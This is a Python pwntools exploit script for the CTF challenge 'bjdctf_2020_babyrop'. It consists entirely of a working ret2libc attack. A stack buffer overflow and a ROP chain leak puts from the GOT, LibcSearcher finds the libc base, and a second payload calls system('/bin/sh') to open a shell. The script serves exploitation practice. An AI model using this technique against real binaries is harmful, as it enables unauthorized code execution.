# coding=utf-8

from pwn import *
from LibcSearcher import *

context.os = 'linux'
context.arch = 'amd64'
context.log_level = 'debug'

p = process('./bjdctf_2020_babyrop')
elf = ELF('./bjdctf_2020_babyrop')

padding = 'a' * 0x20 
fake_ebp = "k1ose2jo"
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
pop_rdi = 0x0400733
main_addr = 0x04006AD

payload1 = padding + fake_ebp 
payload1 += p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)

p.recvuntil('story!')
p.sendline(payload1)
p.recv()
# recv
puts_addr = u64(p.recv(6).ljust(8,'\x00'))

print('puts_addr-> ', hex(puts_addr))
libc = LibcSearcher('puts', puts_addr)
libc_base = puts_addr - libc.dump('puts')
system_addr = libc_base + libc.dump('system')
bin_sh_addr = libc_base + libc.dump('str_bin_sh')
#print('puts_addr-> ', hex(puts_addr))
#print('libc_base-> ', hex(libc_base))
#print('system_addr-> ', hex(system_addr))
#print('bin_sh_addr-> ', hex(bin_sh_addr))

payload2 = padding + fake_ebp
payload2 += p64(pop_rdi) + p64(bin_sh_addr) + p64(system_addr)

p.recvuntil('story!')
p.sendline(payload2)

p.interactive()
